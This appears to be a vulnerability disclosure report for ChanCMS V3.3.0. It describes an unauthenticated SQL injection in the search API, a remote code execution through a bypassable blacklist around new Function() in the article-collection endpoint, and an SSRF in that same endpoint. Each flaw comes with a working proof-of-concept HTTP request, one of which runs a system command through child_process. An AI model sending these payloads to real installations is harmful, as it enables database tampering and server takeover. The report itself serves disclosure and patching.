# Vendor

yanyutao0402

# Product

ChanCMS

# version

 V3.3.0

# Download 

https://gitee.com/yanyutao0402/ChanCMS

# Vulnerability

SQL injection

# Description

In the search page, users can perform SQL injection attacks without logging in and manipulate databases.

# Analysis

The `search` method in `app/modules/api/service/Api.js` does not perform any verification when passing in the key parameters, and directly splicing the SQL statement.

<img width="960" height="217" alt="image" src="https://github.com/user-attachments/assets/47ace82e-eff6-41ab-b020-c8387c05d1c2" />

We reproduce this SQL injection vulnerability

<img width="929" height="725" alt="image" src="https://github.com/user-attachments/assets/16cb132a-c5f7-4972-8425-0c8f0c7127cc" />

# POC
```
GET /api/v1/search?key=%27%20and%20extractvalue(1,concat(0x7e,(select%20version()),0x7e))--%20a HTTP/1.1
Host: localhost:3000
Accept: application/json, text/plain, */*


```




# Vulnerability

RCE

# Description

Although the code tries to clean up parseData using `safeExecuteUserFunction`, this blacklisting method is usually unreliable.Blacklist filtering can be bypassed,users can execute any system command without logging in.

# Analysis

The `search` method in `app/modules/cms/controller/collect.js`，the `getArticle` method also has a potential remote code execution (RCE) vulnerability. It gets the parseData from the request body and then uses `new Function()` to execute it.
Although the code tries to clean up parseData using `safeExecuteUserFunction`, this blacklisting method is usually unreliable. An attacker may find ways to bypass filtering and thus execute arbitrary JavaScript code. Since this is executed on the server side, it is an RCE vulnerability.

<img width="710" height="278" alt="image" src="https://github.com/user-attachments/assets/78d43a54-3aba-4a5e-97f0-40eafe8e3ead" />

We reproduce this RCE vulnerability

<img width="927" height="340" alt="image" src="https://github.com/user-attachments/assets/0cce3e93-609a-412a-b1f6-59920b31cebd" />

Then we request the 666.txt written to see the execution result of the command:

<img width="390" height="153" alt="image" src="https://github.com/user-attachments/assets/8da33dc0-e934-4176-9617-1ed5ac90b66f" />

Of course, you can also directly play a calculator to verify:

<img width="1276" height="697" alt="image" src="https://github.com/user-attachments/assets/7b0f64e1-473a-4b32-a652-6838a93a1ccd" />


# POC
```
POST /cms/collect/getArticle HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Content-Length: 286

{
  "taskUrl": "http://localhost:3000/favicon.ico",
  "titleTag": "title",
  "articleTag": "body",
  "parseData": "return (async () => { const { execSync } = await import(/* webpackIgnore: true */ 'child_process'); return execSync('whoami>app/public/666.txt').toString(); })()"
}

```




# Vulnerability

SSRF

# Description

The `getPages` and `getArticle` methods in `CollectController` both get the URL from the request body and call `collect.common` to get the contents of the URL. In the `getPages` method, the `targetUrl` parameter has been verified by the `isValidTargetUrl` function. However, in the `getArticle` method, the `taskUrl` parameter is not validated by `isValidTargetUrl` before being passed to `collect.common`.

# Analysis

The `getPages` and `getArticle` methods in `CollectController` both get the URL from the request body and call `collect.common` to get the contents of the URL. In the `getPages` method, the `targetUrl` parameter has been verified by the `isValidTargetUrl` function.

<img width="675" height="291" alt="image" src="https://github.com/user-attachments/assets/866beb58-06f2-4834-93a5-4fa1822ecfa9" />

The `isValidTargetUrl` function (defined in `middleware/guard.js`) checks whether the URL points to a private IP address, effectively preventing SSRF attacks. However, in the `getArticle` method, the `taskUrl` parameter is not validated by `isValidTargetUrl` before being passed to `collect.common`.

<img width="809" height="294" alt="image" src="https://github.com/user-attachments/assets/8c849b45-28d3-42a4-b7e6-54f738e95e35" />

This is an obvious SSRF vulnerability. An attacker can provide a URL to an internal network resource (e.g. `http://127.0.0.1:80`) to scan the internal network or interact with internal services.

We reproduce this SSRF vulnerability

<img width="934" height="275" alt="image" src="https://github.com/user-attachments/assets/1ea24def-795f-4d41-9f2a-1e87904f3ad3" />


# POC
```
POST /cms/collect/getArticle HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Content-Length: 123

{
  "taskUrl": "http://127.0.0.1:80",
  "titleTag": "title",
  "articleTag": "body",
  "parseData": "return data;"
}

```
